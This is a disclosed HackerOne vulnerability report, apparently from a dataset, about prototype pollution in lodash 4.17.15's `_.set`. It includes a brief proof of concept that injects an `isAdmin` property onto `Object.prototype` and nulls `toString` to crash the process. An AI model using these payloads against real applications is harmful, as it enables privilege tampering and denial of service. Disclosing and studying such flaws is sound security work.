---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '841380'
original_report_id: '841380'
title: Prototype pollution attack (lodash)
weakness: Uncontrolled Resource Consumption
team_handle: nodejs-ecosystem
created_at: '2020-04-06T12:25:52.689Z'
disclosed_at: '2020-08-25T09:26:13.115Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 1
asset_identifier: lodash
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- uncontrolled-resource-consumption
---

# Prototype pollution attack (lodash)

## Metadata

- HackerOne Report ID: 841380
- Weakness: Uncontrolled Resource Consumption
- Program: nodejs-ecosystem
- Disclosed At: 2020-08-25T09:26:13.115Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

I would like to report a prototype pollution vulnerability in lodash.
It allows an attacker to inject properties on `Object.prototype`.

# Module

module name: lodash
version: 4.17.15
npm page: https://www.npmjs.com/package/lodash

## Module Description

A modern JavaScript utility library delivering modularity, performance, & extras. 

## Module Stats

28M downloads in the last week

# Vulnerability

## Vulnerability Description

`_.set` function can be used to modify `Object.prototype`. If the attacker can control the value of `path`, he can add or modify existing property on all objects.

## Steps To Reproduce:

```js
const _ = require('lodash');

_.set({}, 'constructor.prototype.isAdmin', true);
console.log({}.isAdmin); // true

_.set({}, 'constructor.prototype.toString', null);
console.log({}.toString()); // crash
```

# Wrap up

- I contacted the maintainer to let them know: N 
- I opened an issue in the related repository: N

## Impact

Business logic errors, Denial of service.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
